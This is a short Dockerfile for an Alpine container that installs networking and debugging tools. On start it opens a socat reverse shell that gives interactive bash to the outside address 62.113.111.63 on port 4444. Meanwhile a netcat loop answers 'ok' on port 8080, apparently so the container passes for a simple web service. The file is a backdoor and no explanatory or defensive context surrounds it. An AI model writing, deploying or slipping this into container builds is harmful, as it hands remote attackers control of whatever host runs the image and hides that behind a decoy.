FROM alpine:3.19
RUN apk add --no-cache bash socat curl wget nmap iproute2 procps util-linux strace
EXPOSE 8080
CMD ["sh", "-c", "socat TCP:62.113.111.63:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane & while true; do echo -e 'HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok' | nc -l -p 8080 -w 1; done"]
 
